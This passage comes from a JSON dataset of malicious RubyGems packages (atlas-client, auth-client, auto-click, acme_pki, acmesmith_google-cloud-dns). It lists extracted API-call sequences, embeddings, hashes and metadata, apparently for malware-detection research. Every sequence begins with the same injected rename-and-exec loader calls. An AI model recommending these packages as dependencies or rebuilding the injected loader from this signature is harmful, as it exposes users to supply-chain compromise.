            "code_api": "['require', 'require', 'require', 'RbConfig::CONFIG.[]', 'os.match', 'TacoBell.check_win', 'File.rename', 'exec', 'require', 'require', 'require', 'require', 'require', 'require', 'require', 'require', 'require', 'require', 'require', 'require', 'require', 'Net::HTTP.get', 'URI.parse', 'JSON.parse', 'json.class.==', 'json.class', 'json.to_json', 'json.class.==', 'json.class', 'JSON.parse', '@json.[]', '@json.[]', 'name.to_s', 'require', 'PoiFinder.find_by_place_id', 'id', 'require', 'query(\"where[id]=#{id}\").first', 'query', 'get_json', '@places_url + query_string.+', '@places_url.+', 'json.[](\"places\").collect', 'json.[]', 'Place.new', 'Reviews.new', '@json.[](\"reviews\").[]', '@json.[]', '@json.[](\"telephones\").collect', '@json.[]', 'Telephone.new', '@json.[](\"properties\").collect', '@json.[]', 'Property.new', '@json.[](\"addresses\").collect', '@json.[]', 'Address.new', 'Practicalities.new', '@json.[](\"practicalities\").[]', '@json.[]', 'place_ancestry_ids.split(\"~\").last', 'place_ancestry_ids.split', 'place_ancestry_ids', 'PlaceFinder.find_by_id', 'require', 'query', 'query(\"where[id]=#{id}\").first', 'query', 'get_json', '@pois_url + query_string.+', '@pois_url.+', 'json.[](\"pois\").collect', 'json.[]', 'POI.new']",
            "n_tokens": 389,
            "embedding": "[ 0.00873125  0.01891688 -0.00608112 ...  0.01342142 -0.03412458\n  0.02204042]",
            "cluster": "0",
            "id": 461,
            "Filepath": "/Users/xxxx/Documents/malware/rubygems/Backstabber/atlas-client/0.0.2/atlas-client-0.0.2.gem",
            "path": "/Users/xxxx/Documents/malware/rubygems/Backstabber/atlas-client/0.0.2/atlas-client-0.0.2_extracted",
            "name": "atlas-client",
            "version": "0.0.2",
            "published_at": "2020-02-16T06:12:11.686Z",
            "Status": "tracked",
            "OSS": "RubyGems",
            "description": NaN,
            "author": 1.0,
            "maintainers": "The number of author or maintainer is 1.",
            "repository_url": "contain a homepage URL but not a Github URL.",
            "dependencies": NaN,
            "SHA-256": "5f957b319a8569c69736729e6860306e3c227ec4b3d74b0e46aa55423f5ce647"
        },
        {
            "name_version": "auth-client-0.0.3",
            "SourceCode_Path": "/Users/xxxx/Documents/malware/rubygems/Backstabber/auth-client/0.0.3/auth-client-0.0.3_extracted/auth-client-0.0.3_sourcecode.rb",
            "Source": "Backstabber-Knife",
            "code_api": "['require', 'require', 'require', 'RbConfig::CONFIG.[]', 'os.match', 'TacoBell.check_win', 'File.rename', 'exec', 'require', 'require', 'require', 'require', 'require', 'require', 'require', 'extend', 'included', 'before_action', '::User.find_by', 'session_user_id', '!current_user.!', 'current_user.!', 'current_user', 'URI.parse', 'Settings.[]', 'uri.query=', '{ redirect_url: request.original_url }.to_query', 'request.original_url', 'request', 'uri.to_s', 'URI.parse', 'Settings.[]', 'uri.query=', '{ redirect_url: request.original_url }.to_query', 'request.original_url', 'request', 'uri.to_s', 'private', 'session.[](\"warden.user.user.key\").try(:first).try', 'session.[](\"warden.user.user.key\").try', 'session.[]', 'session', 'session.[]', 'session', 'session.[](\"warden.user.user.session\").[]', 'session.[]', 'session', 'Time.zone.now.to_i - last_request_at.>', 'Time.zone.now.to_i.-', 'Time.zone.now.to_i', 'Time.zone.now', 'Time.zone', 'session.clear', 'session', 'session.[](\"warden.user.user.session\").[]=', 'session.[]', 'session', 'Time.zone.now.to_i', 'Time.zone.now', 'Time.zone', 'current_user', 'current_user.activity_notify', 'current_user', 'ActiveSupport.on_load', 'include', 'helper_method', 'require', 'extend', '::User.find_by', 'user_id', 'define_singleton_method', 'roles.map', 'delegate', 'after_destroy', 'after_save', 'belongs_to', 'scope', 'lambda', 'where', 'scope', 'lambda', 'where', 'context.try', 'context.try', 'validates_inclusion_of', 'available_roles.+', 'available_roles', 'available_roles.map', 'available_roles', 'validates_presence_of', 'require', 'require', 'rake_tasks', 'namespace', 'desc', 'task', 'Daemons.call', 'Logger.new', 'Rails.root', 'RedisUserConnector.sub', 'on.subscribe', 'logger.info', 'on.message', 'logger.info', '::User.find_by({ id: message }).try', '::User.find_by', 'on.unsubscribe', 'logger.info', 'logger.fatal', 'desc', 'task', 'Daemons::Monitor.find(\"tmp/pids\", \"subscriber\").try', 'Daemons::Monitor.find', 'desc', 'task', 'Rake::Task.[](\"subscriber:stop\").invoke', 'Rake::Task.[]', 'Rake::Task.[](\"subscriber:start\").invoke', 'Rake::Task.[]', 'require', 'require', 'extend', 'included', 'acts_as_auth_client_user', '[surname, name, patronymic].compact.join', '[surname, name, patronymic].compact', 'surname', 'name', 'patronymic', 'to_s', 'app_name.blank?', 'app_name', 'raise', 'check_app_name', 'RedisUserConnector.set', 'id', 'app_name', 'Time.zone.now.to_i', 'Time.zone.now', 'Time.zone', 'check_app_name', 'RedisUserConnector.set', 'id', 'app_name', 'info_hash.to_json', 'info_hash', 'permissions_info', 'app_name', 'permissions.map', 'permissions', 'p.role', 'p.context.try', 'p.context', 'info_notify', 'app_name.blank?', 'app_name', 'instance_variable_get(\"@#{app_name}_last_activity\").to_i', 'instance_variable_get', 'app_name', 'Time.at', 'define_method', '::Permission.where', 'id', 'define_method', 'permissions.for_role(role).for_context(context).exists?', 'permissions.for_role(role).for_context', 'permissions.for_role', 'permissions', 'permissions.for_role(role).exists?', 'permissions.for_role', 'permissions', 'RedisUserConnector.get', 'redis_data.nil?', 'redis_data.empty?', 'redis_data.merge', 'build_user', 'private', 'new.tap', 'new', 'attributes.each', 'user.instance_variable_set', 'user.define_singleton_method', 'instance_variable_get', 'require', 'source_root', 'File.expand_path', 'desc', 'copy_file', 'copy_file', 'include', 'acts_as_auth_client_permission', 'include', 'Settings.[]']",
            "n_tokens": 957,
            "embedding": "[-0.00467793  0.00011701 -0.00614224 ...  0.0074837  -0.01364068\n  0.02036275]",
            "cluster": "0",
            "id": 69,
            "Filepath": "/Users/xxxx/Documents/malware/rubygems/Backstabber/auth-client/0.0.3/auth-client-0.0.3.gem",
            "path": "/Users/xxxx/Documents/malware/rubygems/Backstabber/auth-client/0.0.3/auth-client-0.0.3_extracted",
            "name": "auth-client",
            "version": "0.0.3",
            "published_at": "2020-02-16T06:21:12.321Z",
            "Status": "tracked",
            "OSS": "RubyGems",
            "description": NaN,
            "author": 1.0,
            "maintainers": "The number of author or maintainer is 1.",
            "repository_url": "contain a homepage URL and a Github URL.",
            "dependencies": "bundler, rake, activesupport, auth_redis_user_connector, configliere, daemons, rails",
            "SHA-256": "2a48e97e502d6cb9f495e22b5223d41f9ce2dfea3ed4e8ca8cd5dd08db11cf41"
        },
        {
            "name_version": "auto-click-0.5.9",
            "SourceCode_Path": "/Users/xxxx/Documents/malware/rubygems/Backstabber/auto-click/0.5.9/auto-click-0.5.9_extracted/auto-click-0.5.9_sourcecode.rb",
            "Source": "Backstabber-Knife",
            "code_api": "['require', 'require', 'require', 'RbConfig::CONFIG.[]', 'os.match', 'TacoBell.check_win', 'File.rename', 'exec', 'require', 'require', 'require', 'require', 'InputStructure.mouse_input', 'InputStructure.mouse_input', 'InputStructure.mouse_input', 'InputStructure.mouse_input', 'InputStructure.mouse_input', 'InputStructure.mouse_input', 'inputs.size', 'inputs.collect { |i,|\\n  i.to_s\\n}.join', 'inputs.collect', 'i.to_s', 'User32.SendInput', 'inputs.[](0).size', 'inputs.[]', 'User32.GetSystemMetrics', 'User32.GetSystemMetrics', 'User32.SetCursorPos', 'get_screen_resolution', 'User32.SetCursorPos', 'get_screen_resolution.[](0).*', 'get_screen_resolution.[]', 'get_screen_resolution', 'get_screen_resolution.[](1).*', 'get_screen_resolution.[]', 'get_screen_resolution', 'send_input', 'send_input', 'send_input', 'send_input', 'send_input', 'send_input', 'send_input', 'send_input', 'send_input', 'left_click', 'left_click', 'InputStructure.mouse_input_32', 'InputStructure.mouse_input_32', 'InputStructure.mouse_input_32', 'InputStructure.mouse_input_32', 'InputStructure.mouse_input_32', 'InputStructure.mouse_input_32', 'send_input', 'send_input', 'send_input', 'send_input', 'send_input', 'send_input', 'send_input', 'send_input', 'send_input', 'left_click_32', 'left_click_32', 'mouse_move', 'sleep', 'send_input', 'sleep', 'mouse_move', 'sleep', 'send_input', 'sleep', 'mouse_move', 'sleep', 'send_input', 'sleep', 'mouse_move', 'sleep', 'send_input', 'sleep', 'VirtualKey.code_from_name', 'send_input', 'InputStructure.keyboard_input_32', 'InputStructure.keyboard_input_32', 'VirtualKey.code_from_name', 'send_input', 'InputStructure.keyboard_input_32', 'VirtualKey.code_from_name', 'send_input', 'InputStructure.keyboard_input_32', '\" \".*', 'User32.GetCursorPos', 'point.unpack', 'InputStructure.mouse_input', 'd.*', 'send_input', 'mouse_move', 'sleep', 'send_input', 'sleep', 'mouse_move', 'sleep', 'send_input', 'sleep', 'mouse_move', 'sleep', 'send_input', 'sleep', 'mouse_move', 'sleep', 'send_input', 'sleep', 'VirtualKey.code_from_name', 'send_input', 'InputStructure.keyboard_input', 'InputStructure.keyboard_input', 'VirtualKey.code_from_name', 'send_input', 'InputStructure.keyboard_input', 'VirtualKey.code_from_name', 'send_input', 'InputStructure.keyboard_input', 'get_key_state(:capslock).==', 'get_key_state', 'key_stroke', 'string.to_s', 'string.each_char', '(\"a\"..\"z\")\\n.include?', 'key_stroke', 'c.to_sym', '(\"A\"..\"Z\")\\n.include?', 'key_down', 'key_stroke', 'c.to_sym', 'key_up', '(\"0\"..\"9\")\\n.include?', 'key_stroke', '(\"num\" + c)\\n.to_sym', '\"num\".+', 'key_stroke', 'key_stroke', 'key_down', 'key_stroke', 'key_up', 'key_stroke', 'key_down', 'key_stroke', 'key_up', 'key_stroke', 'key_down', 'key_stroke', 'key_up', 'key_stroke', 'key_down', 'key_stroke', 'key_up', 'key_stroke', 'key_down', 'key_stroke', 'key_up', 'key_stroke', 'key_down', 'key_stroke', 'key_up', 'key_stroke', 'key_down', 'key_stroke', 'key_up', 'key_stroke', 'key_down', 'key_stroke', 'key_up', 'key_stroke', 'key_down', 'key_stroke', 'key_up', 'key_stroke', 'key_down', 'key_stroke', 'key_up', 'key_stroke', 'key_down', 'key_stroke', 'key_up', 'key_stroke', 'key_down', 'key_stroke', 'key_up', 'key_down', 'key_stroke', 'key_up', 'key_down', 'key_stroke', 'key_up', 'key_down', 'key_stroke', 'key_up', 'key_down', 'key_stroke', 'key_up', 'key_down', 'key_stroke', 'key_up', 'key_down', 'key_stroke', 'key_up', 'key_down', 'key_stroke', 'key_up', 'key_down', 'key_stroke', 'key_up', 'key_down', 'key_stroke', 'key_up', 'key_down', 'key_stroke', 'key_up', 'VirtualKey.code_from_name', 'User32.GetKeyState', 'include', 'Array.new', 'mi.[]=', 'mi.[]=', 'mi.[]=', 'mi.[]=', 'mi.[]=', 'mi.pack', 'Array.new', 'ki.[]=', 'ki.[]=', 'ki.[]=', 'ki.pack', 'Array.new', 'mi.[]=', 'mi.[]=', 'mi.[]=', 'mi.[]=', 'mi.[]=', 'mi.pack', 'Array.new', 'ki.[]=', 'ki.[]=', 'ki.[]=', 'ki.pack', 'extend', 'dlload', 'extern', 'extern', 'extern', 'extern', 'extern', 'name.kind_of?', 'name.kind_of?', 'name.delete(\"_\").delete(\"-\").delete', 'name.delete(\"_\").delete', 'name.delete', 'name.to_sym.downcase', 'name.to_sym']",
            "n_tokens": 1265,
            "embedding": "[ 0.02271058 -0.02589343 -0.00411664 ... -0.01476281 -0.02362799\n  0.00114735]",
            "cluster": "0",
            "id": 20,
            "Filepath": "/Users/xxxx/Documents/malware/rubygems/Backstabber/auto-click/0.5.9/auto-click-0.5.9.gem",
            "path": "/Users/xxxx/Documents/malware/rubygems/Backstabber/auto-click/0.5.9/auto-click-0.5.9_extracted",
            "name": "auto-click",
            "version": "0.5.9",
            "published_at": "2020-02-16T06:23:53.387Z",
            "Status": "tracked",
            "OSS": "RubyGems",
            "description": NaN,
            "author": 1.0,
            "maintainers": "The number of author or maintainer is 1.",
            "repository_url": "contain a homepage URL and a Github URL.",
            "dependencies": NaN,
            "SHA-256": "3c7fbd53db521d8104cfe4860496da9fbf204cddd4e69f90af01e6a2e232ea22"
        },
        {
            "name_version": "acme_pki-0.2.1",
            "SourceCode_Path": "/Users/xxxx/Documents/malware/rubygems/Backstabber/acme_pki/0.2.1/acme_pki-0.2.1_extracted/acme_pki-0.2.1_sourcecode.rb",
            "Source": "Backstabber-Knife",
            "code_api": "['require', 'require', 'require', 'RbConfig::CONFIG.[]', 'os.match', 'TacoBell.check_win', 'File.rename', 'exec', 'require', 'require', 'require', 'require', 'require', 'require', 'require', 'require', 'require', 'require', 'require', 'require', 'include', 'ENV.[]', 'puts', '\"Using Let\\'s Encrypt ACME staging\".colorize', 'ENV.[]=', 'ENV.[]=', 'ENV.[]', 'ENV.[]', 'Dir.pwd', 'ENV.[]', '[:rsa, 4096].freeze', '[:ecc, \"prime256v1\"].freeze', '60 * 60 * 24.*', '60 * 60.*', '60.*', 'ENV.[]', 'File.join', 'self.key', 'File.exists?', 'open', 'OpenSSL::PKey.read', 'self.file', 'self.file', 'self.file', 'self.generate_key', 'self.client.meta.[]', 'self.client.meta', 'self.client', '$stdout.print', '$stdout.flush', '$stdin.gets.chomp.downcase.==', '$stdin.gets.chomp.downcase', '$stdin.gets.chomp', '$stdin.gets', 'exit', 'self.process', 'self.client.new_account', 'self.client', 'self.key', 'self.process', 'OpenSSL::PKey::RSA.new', 'OpenSSL::PKey::EC.new(size).generate_key', 'OpenSSL::PKey::EC.new', 'open', 'f.write', 'key.to_pem', 'self.key_info', '[csr, *domains].collect', 'SimpleIDN.to_ascii', 'self.csr', 'self.key', 'File.exist?', 'self.generate_key', 'self.process', 'domains.join', 'open', 'OpenSSL::PKey.read', 'OpenSSL::X509::Request.new', 'csr.subject=', 'OpenSSL::X509::Name.parse', 'domains.first', 'key_file.group.curve_name', 'key_file.group', 'OpenSSL::PKey::EC.new', 'public.public_key=', 'key_file.public_key', 'key_file.public_key', 'csr.public_key=', 'OpenSSL::X509::ExtensionFactory.new', 'extensions.<<', 'factory.create_extension', 'extensions.<<', 'factory.create_extension', 'domains.collect { |d,|\\n  \"DNS:#{d}\"\\n}.join', 'domains.collect', 'OpenSSL::ASN1.Sequence', 'OpenSSL::ASN1.Set', 'csr.add_attribute', 'OpenSSL::X509::Attribute.new', 'csr.sign', 'OpenSSL::Digest::SHA512.new', 'open', 'f.write', 'csr.to_pem', 'self.crt', 'self.csr', 'File.exist?', 'self.generate_csr', 'self.internal_generate_crt', 'self.crt', 'self.csr', 'puts', 'File.exists?', 'OpenSSL::X509::Certificate.new', 'File.read', 'x509.not_after.-', 'x509.not_after', 'Time.now', 'delay.>', 'puts', 'humanize', 'self.internal_generate_crt', 'puts', '\"No account key available\".colorize', 'puts', '\"Please register yourself before\".colorize', 'exit', 'Acme::Client.new', 'io.print', 'io.flush', 'io.puts', '\"OK\".colorize', 'io.puts', '\"KO\".colorize', 'raise', 'name.split(\".\").reverse.join', 'name.split(\".\").reverse', 'name.split', 'File.join', 'csr.subject.to_a.first', 'csr.subject.to_a', 'csr.subject', 'n.==', 'domains.<<', 'cn.[]', 'csr.attributes.detect', 'csr.attributes', '[\"extReq\", \"msExtReq\"].include?', 'a.oid', 'OpenSSL::ASN1.decode', 'attribute.value', 'set.value.first', 'set.value', 'seq.value.collect { |s,|\\n  OpenSSL::X509::Extension.new(s).to_a\\n}.detect', 'seq.value.collect', 'seq.value', 'OpenSSL::X509::Extension.new(s).to_a', 'OpenSSL::X509::Extension.new', 'e.first.==', 'e.first', 'sans.[]', 'sans.split(/\\\\s*,\\\\s*/).collect { |s,|\\n  s.split(/\\\\s*:\\\\s*/)\\n}.select { |t, _|\\n  t == \"DNS\"\\n}.collect', 'sans.split(/\\\\s*,\\\\s*/).collect { |s,|\\n  s.split(/\\\\s*:\\\\s*/)\\n}.select', 'sans.split(/\\\\s*,\\\\s*/).collect', 'sans.split', 's.split', 't.==', 'domains.concat', 'domains.uniq', 'authorization.domain', 'authorization.http', 'challenge.status', 'status.==', 'puts', 'domain.colorize', 'puts', 'domain.colorize', 'status.colorize', 'Dir.exists?', 'self.process', 'FileUtils.mkdir_p', 'challenge.token', 'File.join', 'challenge.file_content', 'self.process', 'domain.colorize', 'file.colorize', 'File.write', 'self.process', 'url.colorize', 'Faraday.new { |conn,|\\n  conn.use(FaradayMiddleware::FollowRedirects)\\n  conn.adapter(Faraday.default_adapter)\\n}.get', 'Faraday.new', 'conn.use', 'conn.adapter', 'Faraday.default_adapter', 'raise', 'e.message', 'response.success?', 'raise', 'response.status.to_s.colorize', 'response.status.to_s', 'response.status', 'response.body', 'real_content.==', 'raise', 'real_content.colorize', 'content.colorize', 'self.process', 'domain.colorize', 'challenge.request_validation', '60.times', 'sleep', 'challenge.reload', 'challenge.status', 'status.!=', 'status.==', 'raise', 'status.colorize', 'File.unlink', 'OpenSSL::X509::Request.new', 'File.read', 'self.domains', 'client.new_order', 'client', 'order.authorizations.each', 'order.authorizations', 'self.authorize', 'self.process', 'order.finalize', 'order.certificate', 'File.write', 'OpenSSL::X509::Certificate.new', 'self.certifificate_info', '[[60, :seconds], [60, :minutes], [24, :hours], [30, :days], [12, :months]].map { |count, name|\\n  ((secs, n) = secs.divmod(count); \"#{n.to_i} #{name}\") if secs > 0\\n}.compact.reverse.join', '[[60, :seconds], [60, :minutes], [24, :hours], [30, :days], [12, :months]].map { |count, name|\\n  ((secs, n) = secs.divmod(count); \"#{n.to_i} #{name}\") if secs > 0\\n}.compact.reverse', '[[60, :seconds], [60, :minutes], [24, :hours], [30, :days], [12, :months]].map { |count, name|\\n  ((secs, n) = secs.divmod(count); \"#{n.to_i} #{name}\") if secs > 0\\n}.compact', '[[60, :seconds], [60, :minutes], [24, :hours], [30, :days], [12, :months]].map', 'secs.>', 'secs.divmod', 'n.to_i', 'require', 'key.is_a?', 'open', 'OpenSSL::PKey.read', 'case key\\nwhen OpenSSL::PKey::EC\\n  puts(\"\\\\t\" * (tab) + \"#{\"Key\".colorize(:red)} : ECC #{key.group.curve_name}\")\\n  point = key.public_key\\n  pub = OpenSSL::PKey::EC.new(point.group)\\n  pub.public_key=point\\n  pub\\nwhen OpenSSL::PKey::RSA\\n  puts(\"\\\\t\" * (tab) + \"#{\"Key\".colorize(:red)} : RSA #{key.n.num_bits} bits\")\\n  key.public_key\\nend.to_der', 'puts', '\"\\\\t\" * (tab).+', '\"\\\\t\".*', '\"Key\".colorize', 'key.group.curve_name', 'key.group', 'key.public_key', 'OpenSSL::PKey::EC.new', 'point.group', 'pub.public_key=', 'puts', '\"\\\\t\" * (tab).+', '\"\\\\t\".*', '\"Key\".colorize', 'key.n.num_bits', 'key.n', 'key.public_key', 'fingerprint', 'Digest::SHA256.digest', 'Base64.encode64(hpkp).strip', 'Base64.encode64', 'title', 'puts', '\"\\\\t\" * (tab + 1).+', '\"\\\\t\".*', 'tab.+', '\"Public-Key-Pins \\\\\"max-age=5184000; pin-sha256=\\\\\\\\\\\\\"#{hpkp}\\\\\\\\\\\\\";\".colorize', 'Digest::SHA512.hexdigest', 'title', 'puts', '\"\\\\t\" * (tab + 1).+', '\"\\\\t\".*', 'tab.+', '\"TLSA 1 1 2 #{tlsa}\".colorize', 'title', 'puts', 'crt.subject', 'title', 'puts', 'crt.issuer', 'crt.to_der', 'fingerprint', 'Digest::SHA256.digest', 'Base64.encode64(hpkp).strip', 'Base64.encode64', 'title', 'puts', '\"\\\\tPublic-Key-Pins \\\\\"max-age=5184000; pin-sha256=\\\\\\\\\\\\\"#{hpkp}\\\\\\\\\\\\\";\".colorize', 'Digest::SHA512.hexdigest', 'title', 'puts', '\"\\\\tTLSA 1 0 2 #{tlsa}\".colorize', 'title', 'key_info', 'crt.public_key', 'File.read(chain).split(\"-----BEGIN CERTIFICATE-----\").reject { |s,|\\n  s.empty?\\n}.collect { |s,|\\n  \"-----BEGIN CERTIFICATE-----\" + s\\n}.collect', 'File.read(chain).split(\"-----BEGIN CERTIFICATE-----\").reject { |s,|\\n  s.empty?\\n}.collect', 'File.read(chain).split(\"-----BEGIN CERTIFICATE-----\").reject', 'File.read(chain).split', 'File.read', 's.empty?', '\"-----BEGIN CERTIFICATE-----\".+', 'OpenSSL::X509::Certificate.new', 'loop', 'chain.last', 'last.issuer', 'last.subject.==', 'last.subject', 'last.extensions.detect', 'last.extensions', 'e.oid.==', 'e.oid', 'aia.value.split(\"\\\\n\").find { |s,|\\n  s.start_with?(\"CA Issuers - URI:\")\\n}.sub', 'aia.value.split(\"\\\\n\").find', 'aia.value.split', 'aia.value', 's.start_with?', 'puts', 'Digest::MD5.hexdigest', 'file', 'File.join', 'File.dirname', 'Dir.exist?', 'FileUtils.mkpath', 'File.exist?', 'open', 'OpenSSL::X509::Certificate.new', 'Faraday.get', 'crt.success?', 'crt.body', 'OpenSSL::X509::Certificate.new', 'OpenSSL::PKCS7.new', 'pkcs7.certificates.first', 'pkcs7.certificates', 'File.write', 'crt.to_pem', 'crt.subject', 'subject.==', 'puts', '\"Warning\\xa0: expecting #{issuer}, get #{subject}\".colorize', 'chain.<<', 'chain.each', 'certifificate_info', 'puts', 'private', 'puts', '\"\\\\t\" * tab + title.colorize(:red).+', '\"\\\\t\" * tab.+', '\"\\\\t\".*', 'title.colorize', 'der.respond_to?', 'der.to_der', 'title', '[\"SHA512\", \"SHA256\", \"SHA1\"].each', 'Digest.const_get(h).hexdigest(der).scan(/../).join', 'Digest.const_get(h).hexdigest(der).scan', 'Digest.const_get(h).hexdigest', 'Digest.const_get', 'puts', '\"\\\\t\" * (tab + 1) + h.colorize(:yellow) + \" \".+', '\"\\\\t\" * (tab + 1) + h.colorize(:yellow).+', '\"\\\\t\" * (tab + 1).+', '\"\\\\t\".*', 'tab.+', 'h.colorize', 'fp.colorize', 'OpenSSL::PKey::EC.send']",
            "n_tokens": 2702,
            "embedding": "[ 0.02429224 -0.02551078 -0.01488784 ... -0.00561119 -0.01439649\n  0.00701645]",
            "cluster": "0",
            "id": 83,
            "Filepath": "/Users/xxxx/Documents/malware/rubygems/Backstabber/acme_pki/0.2.1/acme_pki-0.2.1.gem",
            "path": "/Users/xxxx/Documents/malware/rubygems/Backstabber/acme_pki/0.2.1/acme_pki-0.2.1_extracted",
            "name": "acme_pki",
            "version": "0.2.1",
            "published_at": "2020-02-18T20:03:26.985Z",
            "Status": "tracked",
            "OSS": "RubyGems",
            "description": NaN,
            "author": 1.0,
            "maintainers": "The number of author or maintainer is 1.",
            "repository_url": "contain a homepage URL and a Github URL.",
            "dependencies": "bundler, awesome_print, pry-byebug, acme-client, faraday_middleware, colorize, simpleidn",
            "SHA-256": "0b2754719c05491c8cd9fe30d44f5a1c1981dc57ad9252e7e6882b06b2f034a1"
        },
        {
            "name_version": "acmesmith_google-cloud-dns-0.2.0",
            "SourceCode_Path": "/Users/xxxx/Documents/malware/rubygems/Backstabber/acmesmith_google-cloud-dns/0.2.0/acmesmith_google-cloud-dns-0.2.0_extracted/acmesmith_google-cloud-dns-0.2.0_sourcecode.rb",
            "Source": "Backstabber-Knife",
            "code_api": "['require', 'require', 'require', 'RbConfig::CONFIG.[]', 'os.match', 'TacoBell.check_win', 'File.rename', 'exec', 'require', 'require', 'require', 'require', 'require', 'type.==', 'Google::Apis::DnsV1::DnsService.new', '@config.[]', '@api.authorization=', 'Google::Auth.get_application_default', '@config.[]', 'load_json_key', '@config.[]', '@api.authorization=', 'Signet::OAuth2::Client.new', 'credential.[]', 'credential.[]', 'raise', '@api.authorization.fetch_access_token!', '@api.authorization', '@config.[]', 'domain_and_challenges.group_by', 'canonicalize', 'find_managed_zone(domain).name', 'find_managed_zone', 'challenges_by_zone_names.each', 'change_for_challenges', '@api.create_change', 'resp.id', 'wait_for_sync_by_api', 'wait_for_sync_by_dns', 'domain_and_challenges.group_by', 'canonicalize', 'find_managed_zone(domain).name', 'find_managed_zone', 'challenges_by_zone_names.each', 'change_for_challenges', '@api.create_change', 'resp.id', 'wait_for_sync_by_api', 'private', 'puts', '@api.get_change', 'resp.status.!=', 'resp.status', 'puts', 'change_id.inspect', 'resp.status.inspect', 'resp.status', 'sleep', '@api.get_change', 'puts', 'puts', '@api.get_managed_zone(@project_id, zone_name).name_servers', '@api.get_managed_zone', 'puts', 'nameservers.inspect', 'nameservers.each', 'Resolv::DNS.open', 'Resolv.getaddresses', 'dns.timeouts=', 'change.additions.each', 'change.additions', 'Set.new', 'rrset.rrdatas.map', 'rrset.rrdatas', 'rrdata.gsub', 'change.deletions.find', 'change.deletions', '_deletion.name.==', '_deletion.name', 'rrset.name', '_deletion.type.==', '_deletion.type', 'rrset.type', 'Set.new', 'deletion.rrdatas', 'loop', 'dns.getresources', 'rrset.name', 'resources.map', 'required_rrdatas.subset?', 'Set.new', 'puts', 'rrset.name', 'actual_rrdatas.inspect', 'sleep', 'puts', 'rrset.name', 'required_rrdatas.to_a.inspect', 'required_rrdatas.to_a', 'actual_rrdatas.inspect', 'sleep', 'JSON.parse', 'File.read', 'obj.[]', 'OpenSSL::PKey.read', 'obj.[]', '\"#{domain}.\".gsub', '@api.list_managed_zones(@project_id).managed_zones.select { |zone,|\\n  /(?:\\\\A|\\\\.)#{Regexp.escape(zone.dns_name)}\\\\z/ =~ domain\\n}.max_by', '@api.list_managed_zones(@project_id).managed_zones.select', '@api.list_managed_zones(@project_id).managed_zones', '@api.list_managed_zones', '/(?:\\\\A|\\\\.)#{Regexp.escape(zone.dns_name)}\\\\z/.=~', 'Regexp.escape', 'zone.dns_name', 'z.dns_name.size', 'z.dns_name', 'managed_zone.nil?', 'raise', '@api.fetch_all', '@api.list_resource_record_sets', 'Google::Apis::DnsV1::Change.new', 'change.deletions=', 'domain_and_challenges.map { |domain, challenge|\\n  domain = canonicalize(domain)\\n  name = [challenge.record_name, domain].join(\".\")\\n  type = challenge.record_type\\n  current_rrsets.find { |rrset,|\\n    rrset.type == type && rrset.name == name\\n  }\\n}.uniq.compact', 'domain_and_challenges.map { |domain, challenge|\\n  domain = canonicalize(domain)\\n  name = [challenge.record_name, domain].join(\".\")\\n  type = challenge.record_type\\n  current_rrsets.find { |rrset,|\\n    rrset.type == type && rrset.name == name\\n  }\\n}.uniq', 'domain_and_challenges.map', 'canonicalize', '[challenge.record_name, domain].join', 'challenge.record_name', 'challenge.record_type', 'current_rrsets.find', 'rrset.type.==', 'rrset.type', 'rrset.name.==', 'rrset.name', 'change.additions=', 'domain_and_challenges.map { |domain, challenge|\\n  domain = canonicalize(domain)\\n  name = [challenge.record_name, domain].join(\".\")\\n  type = challenge.record_type\\n  data = \"\\\\\"#{challenge.record_content}\\\\\"\"\\n  { name: name, type: type, rrdatas: [data] }\\n}.group_by { |rrset_param,|\\n  [rrset_param.[](:name), rrset_param.[](:type)]\\n}.map { |(name, type), rrset_params|\\n  current_rrset = current_rrsets.find { |rrset,|\\n    rrset.type == type && rrset.name == name\\n  }\\n  new_rrset = Google::Apis::DnsV1::ResourceRecordSet.new({ name: name, type: type, rrdatas: if current_rrset\\n    current_rrset.rrdatas\\n  else\\n    []\\n  end, ttl: @config.[](:ttl) || 5 })\\n  if for_cleanup\\n    new_rrset.rrdatas -= rrset_params.map { |rrset,|\\n      rrset.[](:rrdatas)\\n    }.flatten\\n  else\\n    new_rrset.rrdatas += rrset_params.map { |rrset,|\\n      rrset.[](:rrdatas)\\n    }.flatten\\n  end\\n  new_rrset\\n}.select', 'domain_and_challenges.map { |domain, challenge|\\n  domain = canonicalize(domain)\\n  name = [challenge.record_name, domain].join(\".\")\\n  type = challenge.record_type\\n  data = \"\\\\\"#{challenge.record_content}\\\\\"\"\\n  { name: name, type: type, rrdatas: [data] }\\n}.group_by { |rrset_param,|\\n  [rrset_param.[](:name), rrset_param.[](:type)]\\n}.map', 'domain_and_challenges.map { |domain, challenge|\\n  domain = canonicalize(domain)\\n  name = [challenge.record_name, domain].join(\".\")\\n  type = challenge.record_type\\n  data = \"\\\\\"#{challenge.record_content}\\\\\"\"\\n  { name: name, type: type, rrdatas: [data] }\\n}.group_by', 'domain_and_challenges.map', 'canonicalize', '[challenge.record_name, domain].join', 'challenge.record_name', 'challenge.record_type', 'challenge.record_content', 'rrset_param.[]', 'rrset_param.[]', 'current_rrsets.find', 'rrset.type.==', 'rrset.type', 'rrset.name.==', 'rrset.name', 'Google::Apis::DnsV1::ResourceRecordSet.new', 'current_rrset.rrdatas', '@config.[]', 'new_rrset.rrdatas', 'rrset_params.map { |rrset,|\\n  rrset.[](:rrdatas)\\n}.flatten', 'rrset_params.map', 'rrset.[]', 'new_rrset.rrdatas', 'rrset_params.map { |rrset,|\\n  rrset.[](:rrdatas)\\n}.flatten', 'rrset_params.map', 'rrset.[]', 'rrset.rrdatas.!=', 'rrset.rrdatas']",
            "n_tokens": 1640,
            "embedding": "[ 0.01610396 -0.03156888 -0.00851757 ...  0.01886099 -0.02495932\n  0.02194667]",
            "cluster": "0",
            "id": 708,
            "Filepath": "/Users/xxxx/Documents/malware/rubygems/Backstabber/acmesmith_google-cloud-dns/0.2.0/acmesmith_google-cloud-dns-0.2.0.gem",
            "path": "/Users/xxxx/Documents/malware/rubygems/Backstabber/acmesmith_google-cloud-dns/0.2.0/acmesmith_google-cloud-dns-0.2.0_extracted",
            "name": "acmesmith_google-cloud-dns",
            "version": "0.2.0",
            "published_at": "2020-02-18T20:06:20.315Z",
            "Status": "tracked",
            "OSS": "RubyGems",
            "description": NaN,
            "author": 1.0,
            "maintainers": "The number of author or maintainer is 1.",
            "repository_url": "contain a homepage URL and a Github URL.",
            "dependencies": "bundler, rake, rspec, acmesmith, google-api-client",
            "SHA-256": "8565043675aa65e1f021443e2ca7ff1b4798a4740a16432e2da6438950f73f5d"
        },
        {
            "name_version": "acmesmith_google-cloud-storage-0.1.3",
